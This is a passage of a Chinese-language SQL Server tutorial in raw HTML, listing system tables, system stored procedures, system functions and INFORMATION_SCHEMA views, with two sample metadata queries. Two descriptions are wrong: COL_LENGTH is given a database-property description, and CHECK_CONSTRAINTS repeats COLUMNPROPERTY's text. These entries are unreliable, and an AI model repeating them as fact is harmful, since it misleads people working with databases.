style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">存储当前数据库中的每个索引的信息。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:6;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">sysobjects</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">存储数据库内的每个对象（约束、默认值、日志、规则、存储过程等）的基本信息。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:7;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">sysreferences</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-size:small;"><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">存储所有包括</span><span lang="EN-US"><span style="font-family:’Times New Roman’;"> FOREIGN KEY </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">约束的列。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:8;mso-yfti-lastrow:yes;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">systypes</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">存储系统提供的每种数据类型和用户定义数据类型的详细信息。</span></span><br><br></td><br></tr><br></tbody><br></table><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">将系统存储过程、系统函数、信息架构视图与系统表结合使用，可以方便地让我们获得所有需要的元数据信息。</span></span><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">示例：</span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">1</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">、</span><span style="font-family:’Times New Roman’;"> </span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">获得当前数据库所有用户表的名称。</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">SELECT OBJECT_NAME (id)</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">FROM sysobjects</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">WHERE xtype = ’U’ AND OBJECTPROPERTY (id, ’IsMSShipped’) = 0</span></span><br><br><span style="font-size:small;"><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">其中主要用到了系统表</span><span lang="EN-US"><span style="font-family:’Times New Roman’;"> sysobjects</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">以及其属性</span><span lang="EN-US"><span style="font-family:’Times New Roman’;"> xtype</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">，还有就是用到了</span><span lang="EN-US"><span style="font-family:’Times New Roman’;"> OBJECTPROPERTY </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">系统函数来判断是不是安装</span><span lang="EN-US"><span style="font-family:’Times New Roman’;"> SQL Server </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">的过程中创建的对象。</span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">2</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">、</span><span style="font-family:’Times New Roman’;"> </span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">获得指定表上所有的索引名称</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">SELECT name FROM sysindexes</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">WHERE id = OBJECT_ID (’mytable’) AND indid &gt; 0</span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">—-</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">系统存储过程</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">—————————————————————————</span></span></span><br><br><span lang="EN-US">&lt;o:p&gt;<span style="font-family:’Times New Roman’;font-size:small;">&nbsp;</span>&lt;/o:p&gt;</span><br><br><table style="width:375pt;background:#cccccc;mso-cellspacing:.7pt;mso-padding-alt:3.75pt 3.75pt 3.75pt 3.75pt;" class="MsoNormalTable ke-zeroborder" border="0" cellspacing="1" cellpadding="0" width="500"><br><tbody><br><tr style="mso-yfti-irow:0;mso-yfti-firstrow:yes;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">系统存储过程</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">描述</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:1;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">sp_columns</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回指定表或视图的列的详细信息。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:2;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">sp_databases</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回当前服务器上的所有数据库的基本信息。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:3;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">sp_fkeys</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-size:small;"><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">若参数为带有主键的表，则返回包含指向该表的外键的所有表；若参数为带有外键的表名，则返回所有同过主键</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">/</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">外键关系与该外键相关联的所有表。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:4;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">sp_pkeys</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回指定表的主键信息。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:5;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">sp_server_info</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回当前服务器的各种特性及其对应取值。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:6;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">sp_sproc_columns</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回指定存储过程的的输入、输出参数的信息。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:7;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">sp_statistics</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回指定的表或索引视图上的所有索引以及统计的信息。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:8;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">sp_stored_procedures</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回当前数据库的存储过程列表，包含系统存储过程。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:9;mso-yfti-lastrow:yes;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">sp_tables</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回当前数据库的所有表和视图，包含系统表。</span></span><br><br></td><br></tr><br></tbody><br></table><br><br><span lang="EN-US">&lt;o:p&gt;<span style="font-family:’Times New Roman’;font-size:small;">&nbsp;</span>&lt;/o:p&gt;</span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">—-</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">系统函数</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">—————————————————————————————————-</span></span></span><br><br><table style="width:375pt;background:#cccccc;mso-cellspacing:.7pt;mso-padding-alt:3.75pt 3.75pt 3.75pt 3.75pt;" class="MsoNormalTable ke-zeroborder" border="0" cellspacing="1" cellpadding="0" width="500"><br><tbody><br><tr style="mso-yfti-irow:0;mso-yfti-firstrow:yes;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">COLUMNPROPERTY</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回有关列或过程参数的信息，如是否允许空值，是否为计算列等。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:1;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">COL_LENGTH</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回指定数据库的指定属性值，如是否处于只读模式等。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:2;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">DATABASEPROPERTYEX</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回指定数据库的指定选项或属性的当前设置，如数据库的状态、恢复模型等。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:3;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">OBJECT_ID</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回指定数据库对象名的标识号</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:4;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">OBJECT_NAME</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回指定数据库对象标识号的对象名。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:5;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">OBJECTPROPERTY</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回指定数据库对象标识号的有关信息，如是否为表，是否为约束等。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:6;mso-yfti-lastrow:yes;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">fn_listextendedproperty</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回数据库对象的扩展属性值，如对象描述、格式规则、输入掩码等。</span></span><br><br></td><br></tr><br></tbody><br></table><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">—-</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">使用信息架构视图访问元数据</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">—————————————————————————————————</span></span></span><br><br><span style="font-size:small;"><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">信息架构视图基于</span><span lang="EN-US"><span style="font-family:’Times New Roman’;"> SQL-92 </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">标准中针对架构视图的定义，这些视图独立于系统表，提供了关于</span><span lang="EN-US"><span style="font-family:’Times New Roman’;"> SQL Server </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">元数据的内部视图。信息架构视图的最大优点是，即使我们对系统表进行了重要的修改，应用程序也可以正常地使用这些视图进行访问。因此对于应用程序来说，只要是符合</span><span lang="EN-US"><span style="font-family:’Times New Roman’;"> SQL-92 </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">标准的数据库系统，使用信息架构视图总是可以正常工作的。</span></span><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">常用的信息架构视图有以下一些：</span></span><br><br><table style="width:472.45pt;background:#cccccc;mso-cellspacing:.7pt;mso-padding-alt:3.75pt 3.75pt 3.75pt 3.75pt;" class="MsoNormalTable ke-zeroborder" border="0" cellspacing="1" cellpadding="0" width="630"><br><tbody><br><tr style="mso-yfti-irow:0;mso-yfti-firstrow:yes;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">信息架构视图</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;width:179.3pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;" width="239"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">描述</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:1;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">INFORMATION_SCHEMA .CHECK_CONSTRAINTS</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;width:179.3pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;" width="239"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回有关列或过程参数的信息，如是否允许空值，是否为计算列等。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:2;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">INFORMATION_SCHEMA .COLUMNS</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;width:179.3pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;" width="239"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回当前数据库中当前用户可以访问的所有列及其基本信息。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:3;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">INFORMATION_SCHEMA .CONSTRAINT_COLUMN_USAGE</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;width:179.3pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;" width="239"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回当前数据库中定义了约束的所有列及其约束名。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:4;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">INFORMATION_SCHEMA .CONSTRAINT_TABLE_USAGE</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;width:179.3pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;" width="239"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回当前数据库中定义了约束的所有表及其约束名。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:5;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">INFORMATION_SCHEMA .KEY_COLUMN_USAGE</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;width:179.3pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;" width="239"><br><br><span style="font-size:small;"><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">返回当前数据库中作为主键</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">/</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">外键约束的所有列。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:6;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">INFORMATION_SCHEMA .SCHEMATA</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;width:179.3pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;" width="239"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回当前用户具有权限的所有数据库及其基本信息。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:7;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">INFORMATION_SCHEMA .TABLES</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;width:179.3pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;" width="239"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回当前用户具有权限的当前数据库中的所有表或者视图及其基本信息。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:8;mso-yfti-lastrow:yes;"><br><td 